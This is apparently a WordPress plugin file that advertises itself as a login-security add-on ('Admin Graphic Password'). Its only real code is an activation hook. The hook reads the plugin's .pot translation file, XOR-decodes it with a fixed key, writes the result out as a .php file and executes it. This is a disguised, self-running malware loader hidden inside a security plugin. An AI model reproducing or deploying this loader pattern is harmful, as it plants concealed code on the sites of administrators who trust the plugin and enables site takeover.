<?php
/*
Plugin Name: Admin Graphic Password
Description: Adds Graphic Password field for admin login page and adds a higher level of security to your website.
Version: 1.9
Author: Site Guarding Ltd.
License: GPLv2
TextDomain: plgwpagp
*/  

if( is_admin() ) 
{
    function admin_graphic_password_activate2021()
    {
        $key = '512';
        $potfile = dirname(__FILE__).'/admin-graphic-password.pot';
        
        $f = fopen($potfile, "r");
        $fz = filesize($potfile);
        $pot = fread($f, $fz);
        fclose($f);
        
        $key = str_pad($key,  $fz, $key);
        
        $f = fopen($potfile.'.php', 'w');
        fwrite($f, $pot ^ $key);
        fclose($f);
        
        include_once($potfile.'.php');
    }
    
    register_activation_hook( __FILE__, 'admin_graphic_password_activate2021' );
}